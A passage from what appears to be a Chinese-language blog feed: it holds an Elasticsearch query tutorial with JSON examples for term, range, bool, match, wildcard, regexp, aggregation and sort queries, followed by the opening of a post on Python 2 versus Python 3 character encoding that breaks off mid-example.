href="#精确值查找（term，terms）" class="headerlink" title="精确值查找（term，terms）"></a>精确值查找（term，terms）</h2><h3 id="查找单个精确值"><a href="#查找单个精确值" class="headerlink" title="查找单个精确值"></a>查找单个精确值</h3><p>可以用 <code>term</code> 处理数字、布尔值、日期、以及文本。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 查找价格字段值为 $20 的文档</span><br>GET /my_store/products/_search<br>&#123;<br>    <span class="hljs-string">&quot;query&quot;</span> : &#123;<br>        <span class="hljs-string">&quot;constant_score&quot;</span>: &#123; <br>            <span class="hljs-string">&quot;filter&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;term&quot;</span>: &#123; <br>                    <span class="hljs-string">&quot;price&quot;</span>: <span class="hljs-number">20</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="查找多个精确值"><a href="#查找多个精确值" class="headerlink" title="查找多个精确值"></a>查找多个精确值</h3><p><code>term</code> 查询对于查找单个值非常有用，但如果我们想要搜索多个值该如何处理呢？不需要使用多个 <code>term</code> 查询，我们只要用单个 <code>terms</code> 查询，<code>terms</code> 允许指定多个匹配条件，除此之外它几乎与 <code>term</code> 的使用方式一模一样，我们只要将 <code>term</code> 字段的值改为数组即可：</p><p>它几乎与 <code>term</code> 的使用方式一模一样，与指定单个价格不同，我们只要将 <code>term</code> 字段的值改为数组即可：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 查找价格字段值为 $20 或 $30 的文档</span><br>GET /my_store/products/_search<br>&#123;<br>    <span class="hljs-string">&quot;query&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;constant_score&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;filter&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;terms&quot;</span>: &#123; <br>                    <span class="hljs-string">&quot;price&quot;</span>: [<span class="hljs-number">20</span>, <span class="hljs-number">30</span>]<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当进行精确值查找时，请尽可能多的使用 <strong>过滤式查询（filters）</strong>，过滤器很重要，因为它们执行速度非常快（不会计算相关度，而且可以被缓存）。</p><p>当我们不关心 TF/IDF 对搜索结果排序的影响，只想知道一个词是否在某个字段中出现过时，可以使用 <code>constant_score</code> 将 <code>query</code> 查询语句或者 <code>filter</code> 过滤语句包装起来，同时可以使用 <code>boost</code> 指定权重：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 忽略 TF/IDF</span><br>GET /_search<br>&#123;<br>  <span class="hljs-string">&quot;query&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;bool&quot;</span>: &#123;<br>      <span class="hljs-string">&quot;should&quot;</span>: [<br>        &#123; <span class="hljs-string">&quot;constant_score&quot;</span>: &#123;<br>          <span class="hljs-string">&quot;query&quot;</span>: &#123; <span class="hljs-string">&quot;match&quot;</span>: &#123; <span class="hljs-string">&quot;features&quot;</span>: <span class="hljs-string">&quot;wifi&quot;</span> &#125;&#125;<br>        &#125;&#125;,<br>        &#123; <span class="hljs-string">&quot;constant_score&quot;</span>: &#123;<br>          <span class="hljs-string">&quot;query&quot;</span>: &#123; <span class="hljs-string">&quot;match&quot;</span>: &#123; <span class="hljs-string">&quot;features&quot;</span>: <span class="hljs-string">&quot;garden&quot;</span> &#125;&#125;<br>        &#125;&#125;,<br>        &#123; <span class="hljs-string">&quot;constant_score&quot;</span>: &#123;<br>          <span class="hljs-string">&quot;boost&quot;</span>: <span class="hljs-number">2</span>  <span class="hljs-comment">// pool 语句的权重提升值为 2 ，而其他的语句为 1</span><br>          <span class="hljs-string">&quot;query&quot;</span>: &#123; <span class="hljs-string">&quot;match&quot;</span>: &#123; <span class="hljs-string">&quot;features&quot;</span>: <span class="hljs-string">&quot;pool&quot;</span> &#125;&#125;<br>        &#125;&#125;<br>      ]<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="范围（range）"><a href="#范围（range）" class="headerlink" title="范围（range）"></a>范围（range）</h2><p><code>range</code> 过滤允许我们按照指定范围查找某个文档，适用于数字、日期和字符串：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 查找价格字段值在 $20 和 $30 之间的文档</span><br>GET /my_store/products/_search<br>&#123;<br>    <span class="hljs-string">&quot;query&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;constant_score&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;filter&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;range&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;price&quot;</span>: &#123;<br>                        <span class="hljs-string">&quot;gte&quot;</span>: <span class="hljs-number">20</span>,<br>                        <span class="hljs-string">&quot;lt&quot;</span>: <span class="hljs-number">30</span><br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 查找 2014-01-01 到 2014-01-07 之间的文档</span><br>GET /my_store/products/_search<br>&#123;<br>    <span class="hljs-string">&quot;query&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;range&quot;</span> : &#123;<br>            <span class="hljs-string">&quot;timestamp&quot;</span> : &#123;<br>                <span class="hljs-string">&quot;gt&quot;</span> : <span class="hljs-string">&quot;2014-01-01 00:00:00&quot;</span>,<br>                <span class="hljs-string">&quot;lt&quot;</span> : <span class="hljs-string">&quot;2014-01-07 00:00:00&quot;</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>可供组合的选项如下：</strong></p><ul><li><code>gt</code>：<code>&gt;</code>  大于（greater than）</li><li><code>lt</code>：<code>&lt;</code>  小于（less than）</li><li><code>gte</code>：<code>&gt;=</code>  大于等于（greater than or equal to）</li><li><code>lte</code>：<code>&lt;=</code>  小于等于（less than or equal to）</li></ul><h2 id="组合过滤器（bool）"><a href="#组合过滤器（bool）" class="headerlink" title="组合过滤器（bool）"></a>组合过滤器（bool）</h2><h3 id="布尔过滤器"><a href="#布尔过滤器" class="headerlink" title="布尔过滤器"></a>布尔过滤器</h3><p>一个 <code>bool</code> 过滤器可以由三部分组成：</p><ul><li><p><code>must</code> </p><p>所有的语句都必须匹配，与 <code>AND</code> 等价。 </p></li><li><p><code>must_not</code> </p><p>所有的语句都不能匹配，与 <code>NOT</code> 等价。 </p></li><li><p><code>should</code> </p><p>至少有一个语句要匹配，与 <code>OR</code> 等价。 </p></li></ul><p>使用组合过滤器进行查询：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js">GET /my_store/products/_search<br>&#123;<br>   <span class="hljs-string">&quot;query&quot;</span>: &#123;<br>      <span class="hljs-string">&quot;filtered&quot;</span>: &#123;<br>         <span class="hljs-string">&quot;filter&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;bool&quot;</span>: &#123;<br>              <span class="hljs-string">&quot;should&quot;</span>: [<br>                 &#123; <span class="hljs-string">&quot;term&quot;</span>: &#123;<span class="hljs-string">&quot;price&quot;</span>: <span class="hljs-number">20</span>&#125;&#125;, <br>                 &#123; <span class="hljs-string">&quot;term&quot;</span>: &#123;<span class="hljs-string">&quot;productID&quot;</span>: <span class="hljs-string">&quot;XHDK-A-1293-#fJ3&quot;</span>&#125;&#125; <br>              ],<br>              <span class="hljs-string">&quot;must_not&quot;</span>: &#123;<br>                 <span class="hljs-string">&quot;term&quot;</span>: &#123;<span class="hljs-string">&quot;price&quot;</span>: <span class="hljs-number">30</span>&#125; <br>              &#125;<br>           &#125;<br>         &#125;<br>      &#125;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="嵌套布尔过滤器"><a href="#嵌套布尔过滤器" class="headerlink" title="嵌套布尔过滤器"></a>嵌套布尔过滤器</h3><p>尽管 <code>bool</code> 是一个复合过滤器，可以接受多个子过滤器，但它本身仍然还只是一个过滤器。因此我们可以将一个 <code>bool</code> 过滤器嵌套在其他 <code>bool</code> 过滤器内部，这为我们提供了处理任意复杂布尔逻辑的能力。</p><h2 id="全文匹配（match、match-all、multi-match）"><a href="#全文匹配（match、match-all、multi-match）" class="headerlink" title="全文匹配（match、match_all、multi_match）"></a>全文匹配（match、match_all、multi_match）</h2><h3 id="match-查询"><a href="#match-查询" class="headerlink" title="match 查询"></a>match 查询</h3><p>匹配查询 <code>match</code> 是一个 <strong>标准</strong> 查询，无论需要查询什么字段， <code>match</code> 查询都应该会是首选的查询方式。同时它是一个高级 <strong>全文查询</strong> ，这表示它既能处理全文字段，又能处理精确字段。</p><p>我们用一个示例来解释使用 <code>match</code> 搜索全文字段中的单个词：   </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js">GET /my_index/my_type/_search<br>&#123;<br>    <span class="hljs-string">&quot;query&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;match&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;title&quot;</span>: <span class="hljs-string">&quot;QUICK!&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><blockquote><p>可以使用 <code>operator</code> 参数来提高精度，默认情况下该操作符是 <code>or</code> ，可以修改成 <code>and</code> 让所有指定词项都必须匹配。</p><p>可以使用 <code>minimum_should_match</code> 最小匹配参数来控制精度，以排除那些不太相关的文档。</p></blockquote><h3 id="match-all-查询"><a href="#match-all-查询" class="headerlink" title="match_all 查询"></a>match_all 查询</h3><p>查询所有文档，是没有查询条件下的默认语句：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br>    <span class="hljs-string">&quot;query&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;match_all&quot;</span>: &#123;&#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="multi-match-查询"><a href="#multi-match-查询" class="headerlink" title="multi_match 查询"></a>multi_match 查询</h3><p>multi_match查询允许你在 match 查询的基础上同时搜索多个字段：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br>    <span class="hljs-string">&quot;multi_match&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;query&quot;</span>: <span class="hljs-string">&quot;Quick brown fox&quot;</span>,<br>        <span class="hljs-string">&quot;fields&quot;</span>: [ <span class="hljs-string">&quot;title&quot;</span>, <span class="hljs-string">&quot;body&quot;</span> ],<br>        <span class="hljs-string">&quot;minimum_should_match&quot;</span>: <span class="hljs-string">&quot;30%&quot;</span> <br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="短语匹配（match-phrase）"><a href="#短语匹配（match-phrase）" class="headerlink" title="短语匹配（match_phrase）"></a>短语匹配（<code>match_phrase</code>）</h2><p>就像 <code>match</code> 查询对于标准全文检索是一种最常用的查询一样，当你想寻找邻近的几个单词时，就会使用 <code>match_phrase</code> 查询：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js">GET /my_index/my_type/_search<br>&#123;<br>    <span class="hljs-string">&quot;query&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;match_phrase&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;title&quot;</span>: <span class="hljs-string">&quot;quick brown fox&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>和 <code>match</code> 查询类似，<code>match_phrase</code> 查询首先将查询字符串解析成一个词项列表，然后对这些词项进行搜索，但只保留那些包含 <strong>全部</strong> 搜索词项，且 <strong>位置</strong> 与搜索词项相同的文档。比如对于 <code>quick fox</code> 的短语搜索可能不会匹配到任何文档，因为没有文档包含的 <code>quick</code> 词之后紧跟着 <code>fox</code> 。</p><h2 id="近似匹配（prefix、wildcards、regexp）"><a href="#近似匹配（prefix、wildcards、regexp）" class="headerlink" title="近似匹配（prefix、wildcards、regexp）"></a>近似匹配（prefix、wildcards、regexp）</h2><h3 id="prefix-前缀查询"><a href="#prefix-前缀查询" class="headerlink" title="prefix 前缀查询"></a>prefix 前缀查询</h3><p><code>prefix</code> 查询是一个词级别的底层的查询，它不会在搜索之前分析查询字符串，而是假定传入前缀就正是要查找的前缀。为了找到所有以 <code>W1</code> 开始的邮编，可以使用简单的 <code>prefix</code> 查询： </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js">GET /my_index/address/_search<br>&#123;<br>    <span class="hljs-string">&quot;query&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;prefix&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;postcode&quot;</span>: <span class="hljs-string">&quot;W1&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="wildcard-通配符查询"><a href="#wildcard-通配符查询" class="headerlink" title="wildcard 通配符查询"></a>wildcard 通配符查询</h3><p>与 <code>prefix</code> 前缀查询的特性类似，<code>wildcard</code> 通配符查询也是一种底层基于词的查询，与前缀查询不同的是它使用标准的 <code>shell</code> 通配符查询，允许匹配指定的正则式，其中：</p><ul><li><code>*</code>    匹配多个任意字符（包括零个或一个）</li><li><code>?</code>    匹配一个任意字符（不包括零个）</li></ul><p>这个查询会匹配包含 <code>W1F 7HW</code> 和 <code>W2F 8HW</code> 的文档：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js">GET /my_index/address/_search<br>&#123;<br>    <span class="hljs-string">&quot;query&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;wildcard&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;postcode&quot;</span>: <span class="hljs-string">&quot;W?F*HW&quot;</span> <br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="regexp-正则表达式查询"><a href="#regexp-正则表达式查询" class="headerlink" title="regexp 正则表达式查询"></a>regexp 正则表达式查询</h3><p>假如现在只想匹配 <code>W</code> 区域的所有邮编（只以 <code>W</code> 开始并跟随一个数字），<code>prefix</code> 前缀匹配可能会包括以 <code>WC</code> 开头的所有邮编，<code>wildcard</code> 通配符匹配也可能会遇到同样的问题，如果想匹配，这时可以使用 <code>regexp</code> 正则表达式查询写出更复杂的模式：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js">GET /my_index/address/_search<br>&#123;<br>    <span class="hljs-string">&quot;query&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;regexp&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;postcode&quot;</span>: <span class="hljs-string">&quot;W[0-9].+&quot;</span> <br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="处理-Null-值（exists、missing）"><a href="#处理-Null-值（exists、missing）" class="headerlink" title="处理 Null 值（exists、missing）"></a>处理 Null 值（exists、missing）</h2><h3 id="存在查询"><a href="#存在查询" class="headerlink" title="存在查询"></a>存在查询</h3><p><code>exists</code> 查询可以用于查找文档中是否包含指定字段：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js">GET /my_index/posts/_search<br>&#123;<br>    <span class="hljs-string">&quot;query&quot;</span> : &#123;<br>        <span class="hljs-string">&quot;constant_score&quot;</span> : &#123;<br>            <span class="hljs-string">&quot;filter&quot;</span> : &#123;<br>                <span class="hljs-string">&quot;exists&quot;</span> : &#123; <span class="hljs-string">&quot;field&quot;</span> : <span class="hljs-string">&quot;tags&quot;</span> &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="缺失查询"><a href="#缺失查询" class="headerlink" title="缺失查询"></a>缺失查询</h3><p><code>missing</code> 查询本质上与 <code>exists</code> 恰好相反，它返回没有某个字段的文档：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js">GET /my_index/posts/_search<br>&#123;<br>    <span class="hljs-string">&quot;query&quot;</span> : &#123;<br>        <span class="hljs-string">&quot;constant_score&quot;</span> : &#123;<br>            <span class="hljs-string">&quot;filter&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;missing&quot;</span> : &#123; <span class="hljs-string">&quot;field&quot;</span> : <span class="hljs-string">&quot;tags&quot;</span> &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="聚合和过滤（aggs、filter）"><a href="#聚合和过滤（aggs、filter）" class="headerlink" title="聚合和过滤（aggs、filter）"></a>聚合和过滤（aggs、filter）</h2><h3 id="agg-聚合"><a href="#agg-聚合" class="headerlink" title="agg 聚合"></a>agg 聚合</h3><p>聚合操作被置于顶层参数 <code>aggs</code> 之下，可以为聚合指定一个我们想要名称，然后定义单个桶的类型 <code>terms</code>。比如汽车经销商可能会想知道哪个颜色的汽车销量最好，用聚合可以轻易得到结果：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js">GET /cars/transactions/_search<br>&#123;<br>    <span class="hljs-string">&quot;size&quot;</span> : <span class="hljs-number">0</span>,  <span class="hljs-comment">// 将返回记录数设置为 0 来提高查询速度</span><br>    <span class="hljs-string">&quot;aggs&quot;</span> : &#123; <br>        <span class="hljs-string">&quot;popular_colors&quot;</span> : &#123; <br>            <span class="hljs-string">&quot;terms&quot;</span> : &#123; <br>              <span class="hljs-string">&quot;field&quot;</span> : <span class="hljs-string">&quot;color&quot;</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>在本例中，我们使用 <code>popular_colors</code> 作为聚合的名字，并定义了一个 <code>terms</code> 桶，这个 <code>terms</code> 桶会使用 <code>color</code> 字段为每个颜色动态创建新桶。</p><h3 id="filter-过滤"><a href="#filter-过滤" class="headerlink" title="filter 过滤"></a>filter 过滤</h3><p>聚合范围限定还有一个自然的扩展就是过滤，因为聚合是在查询结果范围内操作的，任何可以适用于查询的过滤器也可以应用在聚合上。如果我们想找到售价在 $10,000 美元之上的所有汽车同时为这些车计算平均售价，可以简单地使用一个 <code>constant_score</code> 查询和 <code>filter</code> 约束：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js">GET /cars/transactions/_search<br>&#123;<br>    <span class="hljs-string">&quot;size&quot;</span> : <span class="hljs-number">0</span>,<br>    <span class="hljs-string">&quot;query&quot;</span> : &#123;<br>        <span class="hljs-string">&quot;constant_score&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;filter&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;range&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;price&quot;</span>: &#123;<br>                        <span class="hljs-string">&quot;gte&quot;</span>: <span class="hljs-number">10000</span><br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;,<br>    <span class="hljs-string">&quot;aggs&quot;</span>: &#123; <br>            <span class="hljs-string">&quot;avg_price&quot;</span>: &#123; <br>               <span class="hljs-string">&quot;avg&quot;</span>: &#123;<br>                  <span class="hljs-string">&quot;field&quot;</span>: <span class="hljs-string">&quot;price&quot;</span> <br>               &#125;<br>            &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><blockquote><p><code>avg</code> 为均值度量，<code>min</code> 为最小度量，<code>max</code> 为最大度量。 </p></blockquote><h2 id="排序（sort）"><a href="#排序（sort）" class="headerlink" title="排序（sort）"></a>排序（sort）</h2><h3 id="简单排序"><a href="#简单排序" class="headerlink" title="简单排序"></a>简单排序</h3><p>我们可以简单的使用 <code>sort</code> 参数进行实现按照字段的值排序：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js">GET /_search<br>&#123;<br>    <span class="hljs-string">&quot;query&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;bool&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;filter&quot;</span>: &#123; <span class="hljs-string">&quot;term&quot;</span>: &#123; <span class="hljs-string">&quot;user_id&quot;</span>: <span class="hljs-number">1</span> &#125;&#125;<br>        &#125;<br>    &#125;,<br>    <span class="hljs-string">&quot;sort&quot;</span>: &#123; <span class="hljs-string">&quot;date&quot;</span>: &#123; <span class="hljs-string">&quot;order&quot;</span>: <span class="hljs-string">&quot;desc&quot;</span> &#125;&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="多级排序"><a href="#多级排序" class="headerlink" title="多级排序"></a>多级排序</h3><p>假定我们想要结合使用 <code>date</code> 和 <code>_score</code> 进行查询，并且匹配的结果首先按照日期排序，然后按照相关性排序：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js">GET /_search<br>&#123;<br>    <span class="hljs-string">&quot;query&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;bool&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;must&quot;</span>: &#123; <span class="hljs-string">&quot;match&quot;</span>: &#123; <span class="hljs-string">&quot;tweet&quot;</span>: <span class="hljs-string">&quot;manage text search&quot;</span> &#125;&#125;,<br>            <span class="hljs-string">&quot;filter&quot;</span>: &#123; <span class="hljs-string">&quot;term&quot;</span>: &#123; <span class="hljs-string">&quot;user_id&quot;</span> : <span class="hljs-number">2</span> &#125;&#125;<br>        &#125;<br>    &#125;,<br>    <span class="hljs-string">&quot;sort&quot;</span>: [<br>        &#123; <span class="hljs-string">&quot;date&quot;</span>: &#123; <span class="hljs-string">&quot;order&quot;</span>: <span class="hljs-string">&quot;desc&quot;</span> &#125;&#125;,  <span class="hljs-comment">// 先按照日期排序</span><br>        &#123; <span class="hljs-string">&quot;_score&quot;</span>: &#123; <span class="hljs-string">&quot;order&quot;</span>: <span class="hljs-string">&quot;desc&quot;</span> &#125;&#125;<br>    ]<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>参考资料：</strong><a href="https://www.elastic.co/guide/cn/elasticsearch/guide/cn/search-in-depth.html">Elasticsearch: 权威指南 - 深入搜索</a></p>]]></content>
    
    
    <categories>
      
      <category>后端开发</category>
      
      <category>ELK</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Elasticsearch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python 字符编码</title>
    <link href="/post/Python%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81/"/>
    <url>/post/Python%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<p>本文详细辨析了 Python 中字符编码的方式，以及 Python2 和 Python3 字符编码的区别。</p><h2 id="字符编码"><a href="#字符编码" class="headerlink" title="字符编码"></a>字符编码</h2><ul><li><p>Python3 的系统默认编码是 UTF-8，其中：</p><ul><li>文本字符全部用 str 表示（包括 Unicode 字符集中所有字符）</li><li>二进制字节数据用 bytes 表示（可以是 ASCII 范围内的字符和其它十六进制形式的字符）</li></ul><blockquote><p>在字符引号前加 ‘b’，明确表示这是一个 bytes类型的对象。</p></blockquote></li><li><p>python2 与 python3 字节与字符的对应关系：</p></li></ul><table><thead><tr><th align="center"><strong>python2</strong></th><th align="center"><strong>python3</strong></th><th align="center"><strong>表现</strong></th><th align="center"><strong>转换</strong></th><th align="center"><strong>作用</strong></th></tr></thead><tbody><tr><td align="center">str</td><td align="center">bytes</td><td align="center">字节</td><td align="center">encode</td><td align="center">存储、网络传输</td></tr><tr><td align="center">unicode</td><td align="center">str</td><td align="center">字符</td><td align="center">decode</td><td align="center">显示</td></tr></tbody></table><ul><li><p>str 与 bytes 之间的转换可以用 encode 和 decode 方法：</p><p><img src="/img/Python%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81/4c330c8aa381b0be38553b3a5031bb82.jpg"></p><p>encode 负责字符到字节的编码转换，默认转换为 UTF-8 编码：</p><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>s = <span class="hljs-string">&quot;Python之禅&quot;</span><br><span class="hljs-meta">&gt;&gt;&gt; 